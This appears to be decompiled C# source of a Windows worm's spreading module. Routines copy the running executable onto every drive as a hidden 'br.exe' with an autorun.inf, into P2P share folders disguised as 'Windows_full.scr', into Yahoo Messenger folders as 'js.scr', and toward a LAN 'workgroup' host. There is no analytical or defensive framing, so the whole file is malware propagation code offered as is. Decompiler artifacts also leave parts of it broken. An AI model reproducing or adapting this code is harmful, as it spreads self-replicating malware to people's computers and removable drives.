namespace Chat
{
    using Chat.My;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.IO;
    using System.Net;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class Spread
    {
        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static void IfYahoo(string FolderPat, string Name)
        {
            if (FileSystem.Dir(FolderPat, FileAttribute.Directory) != null)
            {
                int index = 0;
                string[] directories = Directory.GetDirectories(FolderPat);
                int upperBound = directories.GetUpperBound(0);
                for (index = 0; index <= upperBound; index++)
                {
                    if ((FileSystem.Dir(directories[index], FileAttribute.Directory) != null) && !File.Exists(directories[index] + Name))
                    {
                        File.Copy(FolderPat, directories[index] + Name);
                    }
                }
            }
        }

        private static void LanP1()
        {
            try
            {
                string str = Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
                IPHostEntry hostEntry = Dns.GetHostEntry("workgroup");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void LanSpread()
        {
            LanP1();
            try
            {
                File.Copy(Application.ExecutablePath, "workgroup");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private static void P2PS()
        {
            try
            {
                string str = "Windows_full.scr";
                File.Copy(Application.ExecutablePath, Interaction.Environ(@"programfiles\Shared\" + str));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void P2PSpread(string LimePfadss)
        {
            try
            {
                File.Copy(Application.ExecutablePath, LimePfadss + "Windows_full.scr");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            P2PS();
        }

        private static void SecUSB(string driverse)
        {
            StreamWriter writer = new StreamWriter(driverse + "autorun.inf");
            writer.WriteLine("[autorun]");
            writer.WriteLine("open = br.exe");
            writer.WriteLine("shellexecute=windows.exe");
            writer.Close();
            File.SetAttributes(driverse + "autorun.inf", FileAttributes.Hidden);
            File.SetAttributes(driverse + "br.exe", FileAttributes.Hidden);
        }

        public static void USBSpread()
        {
            try
            {
                programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
                foreach (string str in Directory.GetLogicalDrives())
                {
                    if (!File.Exists(str + "br.exe"))
                    {
                        File.Copy(Assembly.GetExecutingAssembly().Location, str + "br.exe");
                    }
                    SecUSB(str);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void YahooSpread()
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                Module module = Assembly.GetExecutingAssembly().GetModules()[0];
            Label_0019:
                num3 = 3;
                string executablePath = Application.ExecutablePath;
            Label_0022:
                num3 = 4;
                string folderPat = @"C:\Documents and Settings\" + Interaction.Environ("USERNAME") + @"\Local Settings\Application Data\Yahoo Messenger\";
            Label_003F:
                num3 = 5;
                IfYahoo(folderPat, @"\js.scr");
                goto Label_00C6;
            Label_0058:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0019;

                    case 4:
                        goto Label_0022;

                    case 5:
                        goto Label_003F;

                    case 6:
                        goto Label_00C6;

                    default:
                        goto Label_00BB;
                }
            Label_007E:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_00BB;

                    case 1:
                        goto Label_0058;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_007E;
            }
        Label_00BB:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00C6:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }
    }
}

